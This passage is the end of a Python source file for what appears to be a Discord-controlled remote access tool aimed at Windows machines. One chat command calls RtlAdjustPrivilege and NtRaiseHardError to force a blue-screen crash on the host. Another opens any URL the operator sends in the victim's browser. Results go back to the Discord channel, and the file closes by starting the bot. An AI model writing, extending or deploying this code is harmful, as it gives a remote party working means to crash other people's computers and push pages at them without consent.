            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))  # SeShutdownPrivilege = 19
            
            response = ctypes.c_ulong()
            # 0xC0000420: STATUS_ASSERTION_FAILURE
            ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(response))
            await message.channel.send("✅ BSOD command issued.")
        except Exception as e:
            await message.channel.send(f"❌ BSOD execution failed: {str(e)}")
            
    elif content.startswith("!openlink "):
        url = content[10:].strip()
        try:
            webbrowser.open(url)
            await message.channel.send(f"🔗 Opened URL: `{url}`")
        except Exception as e:
            await message.channel.send(f"❌ Failed to open link: {str(e)}")

# Launch client
try:
    client.run(BOT_TOKEN)
except Exception as e:
    ctypes.windll.user32.MessageBoxW(0, f"Discord connection loop crashed: {str(e)}", "Runtime Connection Crash", 0x10)
